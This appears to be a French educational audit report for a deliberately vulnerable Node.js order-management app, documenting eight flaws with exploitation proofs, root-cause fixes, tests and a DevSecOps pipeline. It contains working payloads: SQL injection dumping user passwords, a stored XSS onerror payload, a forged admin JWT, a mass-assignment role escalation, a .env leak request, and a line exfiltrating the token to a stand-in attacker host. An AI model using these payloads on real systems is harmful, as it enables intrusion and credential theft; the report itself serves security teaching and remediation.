# Rapport d'audit sécurité

Projet pédagogique — Application vulnérable, sécurisation & pipeline DevSecOps.

---

## 1. Présentation du projet

L'application est un **mini back-office de gestion de commandes**. Elle reproduit un
cycle complet de sécurité applicative :

> développement **vulnérable** → audit → **exploitation contrôlée** → documentation →
> **correction** (cause profonde) → **sécurisation** → **pipeline DevSecOps**.

Deux branches Git cohabitent dans un seul dépôt :

- **`vulnerable`** : application fonctionnelle contenant **8 vulnérabilités volontaires**
  (6 obligatoires VULN-01 → 06, 2 optionnelles VULN-07/08), toutes **locales et non
  destructives** ;
- **`secure`** : mêmes fonctionnalités, chaque faille **corrigée à la cause profonde**,
  accompagnée de tests automatisés et d'un pipeline CI de sécurité.

---

## 2. Architecture de l'application

- **Backend** : Node.js + Express, organisé en routes / contrôleurs / middlewares.
- **ORM / base** : Sequelize sur SQLite (fichier local `database.sqlite`).
- **Auth** : JWT (`jsonwebtoken`) ; mots de passe via `bcryptjs` (branche `secure`).
- **Frontend** : pages statiques + JS vanilla (`public/`), volontairement minimal.

**Entités** : `User` (rôles `user`/`admin`), `Product`, `Order` (appartient à un user),
`Comment` (avis sur un produit).

```
src/
├── app.js            # middlewares, montage des routes
├── server.js         # bootstrap + listen
├── db/               # init Sequelize + seed (comptes & données)
├── models/           # User / Product / Order / Comment
├── middleware/       # auth.js (JWT, requireRole) · error.js
├── routes/           # auth · users · products · orders · admin
└── controllers/      # logique métier par ressource
public/               # frontend (index.html, app.js, style.css)
tests/                # auth.test.js · orders.test.js · security.test.js
.github/workflows/    # security.yml (pipeline DevSecOps)
```

---

## 3. Installation et lancement

```bash
npm install
cp .env.example .env          # renseigner JWT_SECRET (>= 32 caractères aléatoires)
npm run seed                  # crée la base + données de test
npm start                     # http://localhost:3000
npm test                      # suite de tests (branche secure)
```

**Comptes de test :**

| Email | Mot de passe | Rôle | Notes |
|---|---|---|---|
| `admin@test.local` | `Admin123!` | admin | back-office |
| `user1@test.local` | `User123!` | user | commandes **#101**, **#103** |
| `user2@test.local` | `User123!` | user | commande **#102** |

---

## 4. Organisation Git

| Branche | Rôle |
|---|---|
| `vulnerable` | App + 8 failles. Chaque faille en commit `feat(vuln): ...`. |
| `secure` | Corrections à la cause. Chaque correctif en commit `fix(<domaine>): ...`. |

`secure` est créée **à partir de** `vulnerable`. Convention de commits conventionnelle
en anglais (ex. `fix(authz): enforce ownership on order endpoint`).

---

## 5. Liste des vulnérabilités intégrées

| ID | Faille | OWASP | Criticité |
|---|---|---|---|
| VULN-01 | IDOR / BOLA sur consultation de commande | A01 / API1 | Élevée |
| VULN-02 | Injection SQL | A03 | Critique |
| VULN-03 | XSS stockée | A03 | Élevée |
| VULN-04 | Authentification faible | A07 | Critique |
| VULN-05 | Mass Assignment (élévation de privilèges) | A08 / API6 | Élevée |
| VULN-06 | Misconfiguration / fuite d'information | A05 / A09 | Élevée |
| VULN-07 | Broken Access Control sur routes admin | A01 | Élevée |
| VULN-08 | JWT en `localStorage` (chaînable à la XSS) | A07 | Moyenne |

---

## 6. Audit détaillé des vulnérabilités

> Les preuves ci-dessous ont été obtenues par exploitation réelle sur l'instance locale
> (`http://localhost:3000`). Captures correspondantes dans `screenshots/`.

---

### VULN-01 — IDOR sur consultation de commande

- **Type** : Broken Access Control / IDOR (A01 / API1 BOLA)
- **Endpoint** : `GET /api/orders/:id`
- **Description** : un utilisateur authentifié peut consulter n'importe quelle commande
  en changeant simplement l'identifiant dans l'URL.
- **Cause technique** : `Order.findByPk(req.params.id)` — aucun contrôle d'appartenance
  entre la commande et l'utilisateur authentifié.
- **Exploitation** : user1 (token valide) demande la commande **#102** de user2.

```http
GET /api/orders/102 HTTP/1.1
Authorization: Bearer <token_user1>
```

Réponse vulnérable :

```json
{ "id":102, "userId":3, "customerEmail":"user2@test.local",
  "productName":"Casque audio", "total":149.99, "status":"paid" }
```

- **Preuve** : `screenshots/vuln-01-idor.png`
- **Impact** : fuite de données personnelles (email, historique d'achat, montants),
  risque **RGPD**. **Criticité : Élevée**
- **Correction** (`secure`) : `Order.findOne({ where: { id, userId: req.user.id } })`
  pour les non-admins ; rôle admin vérifié explicitement ; `404` indifférencié sinon.
- **Validation** : `GET /api/orders/102` par user1 renvoie désormais **404** ; sa propre
  commande **#103** renvoie **200** ; un admin obtient **200** sur n'importe quelle commande.

---

### VULN-02 — Injection SQL

- **Type** : Injection (A03)
- **Endpoint** : `GET /api/products/search?q=...`
- **Description** : le paramètre `q` est concaténé directement dans une requête SQL brute.
- **Cause technique** :
  `sequelize.query("SELECT * FROM products WHERE name LIKE '%" + q + "%'")`.
- **Exploitation 1 — contournement de filtre** (`q=' OR '1'='1`) :

```http
GET /api/products/search?q=' OR '1'='1 HTTP/1.1
```

→ renvoie **les 5 produits** au lieu de filtrer (le `WHERE` devient toujours vrai).

- **Exploitation 2 — exfiltration via UNION** (lecture seule, non destructif) :

```http
GET /api/products/search?q=x' UNION SELECT id,email,password,role,createdAt,updatedAt FROM users -- HTTP/1.1
```

Réponse vulnérable (extrait) — **mots de passe en clair exfiltrés** :

```json
[{"id":1,"name":"admin@test.local","description":"Admin123!","price":"admin"},
 {"id":2,"name":"user1@test.local","description":"User123!","price":"user"},
 {"id":3,"name":"user2@test.local","description":"User123!","price":"user"}]
```

- **Preuve** : `screenshots/vuln-02-sqli.png`
- **Impact** : exfiltration de l'intégralité de la base, contournement d'autorisation,
  vol d'identifiants. **Criticité : Critique**
- **Correction** (`secure`) : requête via l'ORM avec `Op.like` (binds gérés par Sequelize,
  donc **paramétrée**) + bornage de la longueur de `q`. Plus aucune concaténation SQL.
- **Validation** : `q=' OR '1'='1` renvoie **0 résultat** (recherche littérale) ; une
  recherche normale (`q=Clavier`) renvoie toujours 1 résultat.

---

### VULN-03 — XSS stockée

- **Type** : Injection / Cross-Site Scripting stockée (A03)
- **Endpoint** : `POST /api/products/:id/comments` puis rendu sur la page produit.
- **Description** : un commentaire contenant du HTML/JS est stocké tel quel puis rendu
  via `innerHTML` côté front : le script s'exécute chez tout visiteur de la page.
- **Cause technique** : aucune sanitization à l'écriture + `element.innerHTML = body`.
- **Exploitation** :

```http
POST /api/products/1/comments HTTP/1.1
Authorization: Bearer <token_user1>
Content-Type: application/json

{ "body": "<img src=x onerror=alert(document.cookie)>" }
```

→ le commentaire est **stocké verbatim** ; à l'affichage, `onerror` exécute le JavaScript.
Chaîné à VULN-08 (`localStorage.getItem('token')`), il permet le **vol du JWT**.

- **Preuve** : `screenshots/vuln-03-xss.png`
- **Impact** : vol de session, défacement, hameçonnage. **Criticité : Élevée**
- **Correction** (`secure`) :
  1. **sanitization serveur** à l'écriture (`sanitize-html`, `allowedTags: []`) ;
  2. **rendu via `textContent`** côté front (plus jamais `innerHTML`) ;
  3. **CSP** stricte via Helmet (`script-src 'self'`, pas d'inline).
- **Validation** : le payload `<img ... >texte` est stocké comme `texte` (HTML supprimé) ;
  le test vérifie l'absence de `<img`/`onerror` dans la valeur stockée.

---

### VULN-04 — Authentification faible

- **Type** : Identification & Authentication Failures (A07)
- **Zone** : `POST /api/auth/login`, génération du JWT, stockage des mots de passe.
- **Description** : cumul de faiblesses d'authentification.
- **Cause technique** :
  - secret JWT **codé en dur / faible** (`secret123`) ;
  - **token sans expiration** ;
  - **mots de passe stockés en clair**, comparaison `===` ;
  - **messages d'erreur précis** → énumération de comptes ;
  - **aucun rate limiting**.
- **Exploitation 1 — énumération de comptes** :

```http
POST /api/auth/login  { "email":"inconnu@x.com", ... }   → 401 {"error":"Utilisateur inconnu"}
POST /api/auth/login  { "email":"user1@test.local", ... } → 401 {"error":"Mot de passe incorrect"}
```

Les deux messages diffèrent : un attaquant distingue les emails existants.

- **Exploitation 2 — forge de token** (secret faible deviné/fuité via VULN-06) :

```js
jwt.sign({ id:1, email:'admin@test.local', role:'admin' }, 'secret123')
```

→ ce token forgé est **accepté** par l'API : prise de contrôle du compte admin sans mot de passe.

- **Preuve** : `screenshots/vuln-04-auth.png`
- **Impact** : prise de contrôle de comptes, usurpation d'admin. **Criticité : Critique**
- **Correction** (`secure`) :
  - secret JWT depuis `process.env`, **exigé ≥ 32 caractères** (pas de repli codé en dur) ;
  - **expiration** (`expiresIn: '1h'`) ;
  - mots de passe **hachés bcrypt** (seed et inscription), comparaison `bcrypt.compare` ;
  - message d'erreur **générique** unique (« Identifiants invalides ») ;
  - **rate limiting** (`express-rate-limit`, 10 tentatives / 15 min) sur `/login` et `/register`.
- **Validation** : messages identiques pour email inconnu et mauvais mot de passe ; token
  forgé avec `secret123` rejeté (**401**) ; le JWT contient un champ `exp`.

---

### VULN-05 — Mass Assignment

- **Type** : Mass Assignment / élévation de privilèges (A08 / API6 ; A01)
- **Endpoint** : `PUT /api/users/me`
- **Description** : tout le corps de la requête est passé à `user.update()`, y compris des
  champs sensibles non destinés à l'utilisateur (`role`).
- **Cause technique** : `await user.update(req.body)`.
- **Exploitation** :

```http
PUT /api/users/me HTTP/1.1
Authorization: Bearer <token_user1>
Content-Type: application/json

{ "role": "admin" }
```

→ user1 devient **admin** (réponse : `role: "admin"`).

- **Preuve** : `screenshots/vuln-05-mass-assignment.png`
- **Impact** : élévation de privilèges horizontale puis verticale. **Criticité : Élevée**
- **Correction** (`secure`) : **whitelist** explicite des champs modifiables
  (`name`, `email` uniquement) ; `role`/`id`/`password` ignorés ; le mot de passe n'est
  jamais renvoyé (projection `attributes`).
- **Validation** : `PUT /api/users/me {"role":"admin","name":"Hacker"}` →
  `role` reste `user`, `name` mis à jour, `password` absent de la réponse.

---

### VULN-06 — Security Misconfiguration / Information Disclosure

- **Type** : Security Misconfiguration / Security Logging & Monitoring (A05 / A09)
- **Zone** : configuration Express globale + handler d'erreurs.
- **Description** : cumul de mauvaises configurations.
- **Cause technique** :
  - **aucun header de sécurité** (pas de Helmet, pas de CSP) ;
  - **stack traces renvoyées** dans les réponses d'erreur ;
  - **CORS** `origin: "*"` **avec** `credentials: true` ;
  - **service statique de la racine** du projet (`express.static('.')`, dotfiles autorisés).
- **Exploitation 1 — fuite de secrets** :

```http
GET /.env HTTP/1.1
```

→ renvoie le fichier `.env` : `JWT_SECRET=secret123`, faux secrets DEMO_ONLY (et permet de
forger des tokens, cf. VULN-04).

- **Exploitation 2 — stack trace** : une erreur serveur renvoie
  `{"error":"SQLITE_ERROR: ...","stack":"Error\n at .../sequelize/lib/..."}`,
  divulguant l'arborescence et la stack technique.
- **Exploitation 3** : en-têtes de réponse dépourvus de `X-Frame-Options`,
  `Content-Security-Policy`, etc. ; `Access-Control-Allow-Origin: *`.

- **Preuve** : `screenshots/vuln-06-misconfig.png`
- **Impact** : fuite de secrets, cartographie de l'application, clickjacking, CORS abusif.
  **Criticité : Élevée**
- **Correction** (`secure`) :
  - **Helmet** (HSTS, X-Frame-Options, X-Content-Type-Options, **CSP**) ;
  - handler d'erreurs **générique** (pas de stack, message neutre en prod) ;
  - **CORS** restreint à `http://localhost:3000` ;
  - service statique réduit à `public/` (**dotfiles refusés**) ;
  - **`.env` retiré du dépôt** et ignoré par git.
- **Validation** : `GET /.env` → **404** ; 4 en-têtes de sécurité présents
  (`x-frame-options`, `content-security-policy`, `x-content-type-options: nosniff`, HSTS) ;
  CORS non wildcard.

---

### VULN-07 — Broken Access Control sur routes admin

- **Type** : Broken Access Control (A01)
- **Endpoint** : `GET /api/admin/users`, `GET /api/admin/orders`
- **Description** : les routes admin sont protégées par le middleware d'authentification
  mais **aucune vérification de rôle** n'est effectuée.
- **Cause technique** : `router.get('/users', auth, ctrl.listUsers)` — `auth` valide le
  token mais n'inspecte pas `role`.
- **Exploitation** :

```http
GET /api/admin/users HTTP/1.1
Authorization: Bearer <token_user1>
```

→ **200** : un utilisateur standard reçoit la liste complète des comptes (avec, côté
vulnerable, les mots de passe en clair).

- **Preuve** : `screenshots/vuln-07-bac.png`
- **Impact** : exposition de tous les comptes et commandes. **Criticité : Élevée**
- **Correction** (`secure`) : middleware `requireRole('admin')` appliqué via
  `router.use(auth, requireRole('admin'))` sur **toutes** les routes `/api/admin/*` ;
  les mots de passe ne sont plus jamais renvoyés.
- **Validation** : user1 → **403** ; admin → **200** sans champ `password`.

---

### VULN-08 — Stockage du JWT dans `localStorage`

- **Type** : Identification & Authentication Failures (A07) — chaînable à VULN-03
- **Zone** : `public/app.js`
- **Description** : le JWT est stocké dans `localStorage`, donc accessible à tout
  JavaScript de la page — y compris un script injecté par XSS.
- **Cause technique** : `localStorage.setItem('token', jwt)` +
  `localStorage.getItem('token')`.
- **Exploitation** : la XSS stockée (VULN-03) exécute
  `new Image().src = '//attaquant/?t=' + localStorage.getItem('token')` → **vol du token**.
- **Preuve** : `screenshots/vuln-08-token.png`
- **Impact** : usurpation d'identité persistante. **Criticité : Moyenne**
- **Correction** (`secure`) : la **XSS étant corrigée** (sanitization + `textContent` + CSP),
  l'exfiltration par script injecté n'est plus possible. En production réelle, on
  privilégierait un **cookie `httpOnly` + `SameSite`** (compromis documenté dans le code).
- **Validation** : aucun payload injecté ne s'exécute (cf. VULN-03), donc le token n'est
  plus accessible à un script tiers.

---

## 7. Pipeline sécurité

`.github/workflows/security.yml`, déclenché sur `push` et `pull_request` :

| Job | Outil | Rôle | Blocage |
|---|---|---|---|
| `build-test` | Jest + Supertest | tests fonctionnels & sécurité | ✅ |
| `sast` | **Semgrep** (`p/owasp-top-ten`, `p/javascript`) | analyse statique | ✅ (`--error`) |
| `sca` | **npm audit** (`--omit=dev --audit-level=high`) | dépendances | ✅ |
| `secret-scan` | **Gitleaks** | secrets committés | ✅ |
| `dast` | **OWASP ZAP** baseline | analyse dynamique de l'app lancée | informatif |

Le job `dast` génère un `.env` à secret fort, seed la base, démarre le serveur
(`wait-on`), puis scanne `http://localhost:3000`.

---

## 8. Résultats des scans

> Section à compléter avec les sorties réelles de la CI après le premier `push`
> (captures dans `screenshots/`). Comportement attendu :

- **build-test** : 23 tests verts (3 suites : `auth`, `orders`, `security`).
- **sast (Semgrep)** : sur `vulnerable`, remontée des patterns (SQL brut, `innerHTML`,
  secret en dur, CORS `*`) ; sur `secure`, absence de finding bloquant.
- **sca (npm audit)** : production sans vulnérabilité ≥ high (cf. §9 pour les advisories
  résiduelles de la chaîne de build de `sqlite3`).
- **secret-scan (Gitleaks)** : sur `secure`, aucun secret (le `.env` est retiré).
- **dast (ZAP)** : sur `secure`, alertes réduites grâce aux en-têtes Helmet/CSP.

---

## 9. Limites du projet

- **Périmètre pédagogique** : la richesse fonctionnelle est volontairement minimale ;
  l'accent est mis sur la logique de sécurité.
- **SQLite local** : pas de séparation réseau, pas de gestion de connexions concurrentes.
- **Advisories transitives** : `sqlite3` tire une chaîne de build (`node-gyp`, `tar`,
  `cacache`) avec des advisories `high` **non exécutées au runtime**. L'audit CI est donc
  scopé aux dépendances de **production** (`--omit=dev`).
- **VULN-08** : par simplicité de démonstration, le JWT reste en `localStorage` sur le
  front ; en production, un cookie `httpOnly`+`SameSite` serait préférable.
- **DAST** : le scan ZAP est en mode *baseline* (passif), non exhaustif.

---

## 10. Conclusion

Le projet démontre un cycle complet **offensif et défensif** : 8 vulnérabilités réalistes,
exploitées et prouvées sur la branche `vulnerable`, puis **corrigées à la cause profonde**
sur la branche `secure` (contrôle d'appartenance, requêtes paramétrées, sanitization + CSP,
authentification robuste, whitelist de champs, en-têtes de sécurité, contrôle de rôle).

Les corrections sont **verrouillées par 23 tests automatisés** et un **pipeline DevSecOps**
combinant SAST, SCA, secret scanning et DAST. L'ensemble illustre qu'une application simple
mais rigoureuse sur sa logique de sécurité constitue une base saine et auditable.
